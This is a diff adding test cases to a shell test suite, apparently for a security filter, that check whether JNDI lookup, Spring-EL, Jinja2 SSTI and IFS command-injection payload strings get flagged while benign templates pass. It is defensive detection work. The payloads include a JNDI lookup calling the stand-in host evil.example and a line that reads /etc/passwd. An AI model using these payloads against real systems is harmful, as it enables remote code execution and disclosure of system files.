@@ -10382,6 +10382,16 @@ for u in 'https://l.com/?next=//l.com/self' \
         || check "url: ${u} benign redirect stays OK" "0" "1"
 done
 
+# ── cycle-98: server-side exploit payload text (JNDI/SSTI) ──
+check_text_hit '${jndi:ldap://evil.example/x}' 'BLOCK' "text: JNDI lookup payload flagged"
+check_text_hit '#{T(java.lang.Runtime).exec}' 'BLOCK' "text: Spring-EL class-ref flagged"
+check_text_hit '{{x.__class__.__mro__}}' 'ALERT' "text: Jinja2 dunder SSTI chain flagged"
+check_text_hit 'cat${IFS}/etc/passwd' 'LOG' "text: IFS whitespace bypass flagged"
+check_text_hit '{{7*7}}' 'LOG' "text: canonical SSTI probe flagged"
+check_text_hit 'normal ${placeholder} text here' 'OK' "text: benign placeholder clean"
+check_text_hit 'Hello {{name}}, your order shipped' 'OK' "text: benign mustache template clean"
+check_text_hit 'python __init__ constructor docs' 'OK' "text: benign dunder mention clean"
+
 # ─── results ────────────────────────────────────────────────────────────
 
 echo ""
